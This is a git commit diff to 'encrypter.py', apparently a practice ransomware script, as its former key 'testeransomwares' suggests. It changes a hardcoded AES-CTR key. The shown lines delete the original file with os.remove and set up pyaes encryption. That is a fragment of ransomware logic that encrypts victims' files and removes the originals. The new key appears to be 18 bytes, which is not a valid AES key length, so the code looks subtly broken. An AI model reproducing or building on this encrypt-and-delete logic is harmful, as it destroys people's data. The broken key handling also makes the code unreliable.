e778e0c08fc21b6bfebc0cc4100602347b346f75
Dasw <69166890+xDaswx@users.noreply.github.com>
2024-01-14 16:41:41 -0300

    Update encrypter.py
    key

--- encrypter.py
+++ encrypter.py
@@ -11,7 +11,7 @@ file.close()
 os.remove(file_name)
 
 ## chave de criptografia
-key = b"testeransomwares"
+key = b"2wedqwwsdqaq3241`^"
 aes = pyaes.AESModeOfOperationCTR(key)
 
 ## criptografar o arquivo
